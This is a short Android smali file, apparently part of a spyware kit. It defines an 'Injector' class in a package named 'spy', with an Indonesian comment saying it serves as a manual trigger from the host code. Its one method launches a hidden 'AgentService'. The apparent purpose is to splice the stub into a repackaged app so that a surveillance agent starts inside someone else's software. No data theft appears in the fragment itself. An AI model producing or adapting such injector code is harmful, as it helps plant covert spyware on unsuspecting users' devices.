.class public Lai/m4zk1play/spy/Injector;
.super Ljava/lang/Object;

# Dipakai bila target butuh pemicu manual dari kode host.
.method public static start(Landroid/content/Context;)V
    .registers 3
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lai/m4zk1play/spy/AgentService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
